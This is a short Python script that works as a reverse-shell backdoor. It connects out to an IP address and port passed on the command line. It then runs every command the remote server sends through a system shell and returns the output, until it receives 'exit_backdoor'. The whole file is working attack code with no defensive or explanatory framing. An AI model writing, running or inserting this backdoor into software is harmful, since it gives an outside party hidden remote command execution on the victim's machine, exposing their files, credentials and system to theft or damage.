import socket
import sys
import subprocess

def run_shell_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

def main():
    if len(sys.argv) < 3:
        print("Usage: python script.py <IP_address> <Port>")
        return

    IP_address = sys.argv[1]
    Port = int(sys.argv[2])

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.connect((IP_address, Port))
        print("Connected to the server.")

        while True:
            command = server.recv(1024).decode("utf-8")
            if command == "exit_backdoor":
                server.close()
                print("Connection closed.")
                exit()

            command = command.strip()
            command_parts = command.split(" ")
            result = run_shell_command(command_parts)
            server.send(bytes(result, "utf-8"))

    except ConnectionRefusedError:
        print("Connection refused. Make sure the server is running.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if server:
            server.close()

if __name__ == "__main__":
    main()
